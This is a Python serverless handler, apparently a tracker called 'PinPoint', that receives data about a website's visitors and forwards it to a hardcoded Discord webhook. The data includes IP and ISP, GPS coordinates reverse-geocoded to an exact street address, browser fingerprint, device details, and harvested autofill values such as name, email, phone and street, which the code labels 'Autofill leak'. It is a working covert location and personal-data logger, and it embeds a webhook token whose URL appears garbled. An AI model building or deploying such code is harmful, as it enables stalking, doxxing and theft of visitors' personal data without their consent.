import os
import json
import urllib.request
from http.server import BaseHTTPRequestHandler

# Webhook is built in. Set DISCORD_WEBHOOK_URL in Vercel to override.
WEBHOOK = os.environ.get("DISCORD_WEBHOOK_URL") or \
    "https://discord.com/api/webhooks/1558131410307653684/https://discord.com/api/webhooks/1558282854230794381/WdY3cYeJVvrw6uNB1tkCkgCGH5Nc--4ECJUiFWkM-d9PmFXKpEjbQZ4_MnyJYZQPFJ0B"

UA = "Mozilla/5.0 (compatible; pinpoint/1.0)"


def http_json(url, headers=None, timeout=6):
    req = urllib.request.Request(url, headers=headers or {"User-Agent": UA})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return json.loads(r.read().decode())


def first_ip(headers):
    xff = headers.get("x-forwarded-for", "")
    if xff:
        return xff.split(",")[0].strip()
    return headers.get("x-real-ip", "") or headers.get("cf-connecting-ip", "")


def vercel_geo(headers):
    return {
        "city": headers.get("x-vercel-ip-city", ""),
        "region": headers.get("x-vercel-ip-country-region", ""),
        "country": headers.get("x-vercel-ip-country", ""),
        "lat": headers.get("x-vercel-ip-latitude", ""),
        "lon": headers.get("x-vercel-ip-longitude", ""),
        "tz": headers.get("x-vercel-ip-timezone", ""),
    }


def lookup_ip(ip):
    if not ip:
        return {}
    try:
        return http_json(
            "http://ip-api.com/json/%s?fields=status,country,countryCode,regionName,"
            "city,zip,lat,lon,timezone,isp,org,as,query" % ip
        )
    except Exception:
        return {}


def reverse_geocode(lat, lon):
    if not lat or not lon:
        return ""
    try:
        data = http_json(
            "https://nominatim.openstreetmap.org/reverse?format=json&lat=%s&lon=%s"
            "&zoom=18&addressdetails=1" % (lat, lon),
            headers={"User-Agent": UA},
        )
        return data.get("display_name", "")
    except Exception:
        return ""


def send_webhook(embed):
    body = json.dumps({"embeds": [embed]}).encode()
    req = urllib.request.Request(
        WEBHOOK, data=body,
        headers={"Content-Type": "application/json", "User-Agent": UA},
    )
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status in (200, 204), ""
    except Exception as e:
        return False, str(e)


def map_link(lat, lon):
    return "https://www.google.com/maps?q=%s,%s" % (lat, lon) if lat and lon else ""


class handler(BaseHTTPRequestHandler):
    def _json(self, obj, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(obj).encode())

    def do_GET(self):
        if "test" in self.path:
            ok, err = send_webhook({
                "title": "PinPoint · webhook test",
                "description": "If you see this, the webhook works.",
                "color": 0x4F8CFF,
            })
            return self._json({"sent": ok, "message": err})
        self._json({"ip": first_ip(self.headers), "geo": vercel_geo(self.headers)})

    def do_POST(self):
        try:
            n = int(self.headers.get("content-length", 0))
            body = json.loads(self.rfile.read(n) or b"{}")
        except Exception as e:
            return self._json({"status": "error", "message": str(e)}, 400)

        ip = body.get("ip") or first_ip(self.headers)
        vg = vercel_geo(self.headers)
        intel = lookup_ip(ip)
        bg = body.get("browser_geo") or {}

        lat = bg.get("lat") or vg.get("lat") or intel.get("lat")
        lon = bg.get("lon") or vg.get("lon") or intel.get("lon")
        precise = bool(bg.get("lat"))
        source = "GPS (exact)" if precise else "IP-based (approx)"

        address = reverse_geocode(lat, lon)

        city = vg.get("city") or intel.get("city") or "?"
        region = vg.get("region") or intel.get("regionName") or "?"
        country = vg.get("country") or intel.get("country") or "?"
        tz = body.get("tz") or vg.get("tz") or intel.get("timezone") or "?"

        fp = body.get("fingerprint") or "unknown"
        fpc = body.get("fingerprint_components") or {}
        af = body.get("autofill") or {}

        fields = [
            {"name": "IP", "value": "`%s`" % (ip or "unknown"), "inline": True},
            {"name": "ISP", "value": intel.get("isp") or "unknown", "inline": True},
            {"name": "ASN", "value": intel.get("as") or "unknown", "inline": True},
        ]

        af_map = [
            ("Name", "name"), ("Email", "email"), ("Phone", "tel"),
            ("Street", "street-address"), ("ZIP", "postal-code"),
            ("Organization", "organization"), ("Username", "username"), ("Country", "country"),
        ]
        af_lines = ["%s: %s" % (label, af[key]) for label, key in af_map if af.get(key)]
        if af_lines:
            fields.append({"name": "Autofill leak", "value": "\n".join(af_lines)[:1000], "inline": False})

        if address:
            fields.append({"name": "Exact address", "value": address[:1000], "inline": False})

        fields += [
            {"name": "City / Region / Country", "value": "%s, %s, %s" % (city, region, country), "inline": False},
            {"name": "Coordinates", "value": ("%s, %s  (%s)" % (lat, lon, source)) if lat else "unavailable", "inline": False},
            {"name": "Timezone", "value": tz, "inline": True},
            {"name": "ZIP (IP)", "value": intel.get("zip") or "?", "inline": True},
            {"name": "Device", "value": "%s @ %sx DPR" % (body.get("screen", "?"), body.get("dpr", "?")), "inline": True},
            {"name": "Language", "value": body.get("language", "?"), "inline": True},
            {"name": "Platform", "value": (body.get("ua") or "?")[:200], "inline": False},
            {"name": "Fingerprint", "value": "`%s`" % fp, "inline": False},
        ]
        if fpc:
            fields.append({"name": "Fingerprint detail", "value":
                "GPU: %s\nCores: %s · Mem: %s GB · Touch: %s · Platform: %s · Fonts: %s"
                % (fpc.get("renderer") or "?", fpc.get("cores") or "?",
                   fpc.get("memory") or "?", fpc.get("touch") or "?",
                   fpc.get("platform") or "?", fpc.get("fonts") or "?"), "inline": False})
        fields += [
            {"name": "Referrer", "value": body.get("referrer") or "direct", "inline": False},
            {"name": "Page", "value": (body.get("url") or "?")[:200], "inline": False},
        ]

        embed = {
            "title": "New Visitor Located",
            "color": 0xFFFC00,
            "fields": fields,
            "footer": {"text": body.get("label") or "PinPoint · Kayden Hogan"},
            "timestamp": body.get("ts"),
        }
        if map_link(lat, lon):
            embed["url"] = map_link(lat, lon)

        ok, err = send_webhook(embed)
        self._json({"status": "ok" if ok else "error", "sent": ok, "message": err, "address": address})
